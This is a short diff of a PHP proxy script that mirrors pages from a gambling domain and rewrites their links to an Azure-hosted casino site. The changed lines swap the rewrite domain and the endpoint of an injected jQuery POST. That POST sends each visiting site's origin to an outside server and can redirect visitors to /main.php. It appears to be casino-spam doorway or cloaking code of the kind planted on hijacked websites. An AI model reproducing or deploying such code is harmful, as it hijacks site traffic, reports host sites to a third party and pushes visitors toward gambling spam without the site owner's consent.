@@ -153,8 +153,8 @@ curl_setopt( $ch, CURLOPT_USERAGENT, "Proxy" );
 curl_setopt( $ch, CURLOPT_HEADER, 0 );
 $contents = curl_exec( $ch );
 curl_close( $ch );
-$bodytag = str_replace( "((?!slot-onlinuuz\.net/b)\w+(?:\.\w+)+", "https://worlds-icazinos.azurewebsites.net/", $contents );
-$result  = preg_replace( '~' . $new_url . '~m', "worlds-icazinos.azurewebsites.net", $contents );
+$bodytag = str_replace( "((?!slot-onlinuuz\.net/b)\w+(?:\.\w+)+", "https://worlds-icazinoz.azurewebsites.net/", $contents );
+$result  = preg_replace( '~' . $new_url . '~m', "worlds-icazinoz.azurewebsites.net", $contents );
 preg_match_all( "/(https:\/\/slot-onlinuuz.net).*\.(css|jpg|ico|svg|png|js|jpeg|webp|swf|gif|woff2|woff|ttf|pdf)/m", $contents, $urls_delim );
 if ( strpos( $contents, '<title>404 Not Found |' ) !== false ) {
 	header( "HTTP/1.1 404 Internal Server Error", true, 404 );
@@ -218,7 +218,7 @@ $cachetime = 999999;
 // loc:window.location.origin,
 // };
 // jQuery.ajaxSetup({async:false, crossOrigin: true});
-// jQuery.post( "https://dev.perteq.ru/worldicasino.php", data, function(response) {
+// jQuery.post( "https://slot-onlinuuz.net/worldicasino.php", data, function(response) {
 // if(response == 0){
 // location.href = "/main.php";
 // }
@@ -245,7 +245,7 @@ echo '<script type="text/javascript">
 			loc:window.location.origin,
 		};
 		jQuery.ajaxSetup({async:false, crossOrigin: true});
-		jQuery.post( "https://dev.perteq.ru/worldicasino.php", data, function(response) {
+		jQuery.post( "https://slot-onlinuuz.net/worldicasino.php", data, function(response) {
 			if(response == 0){
 				location.href = "/main.php";
 			}
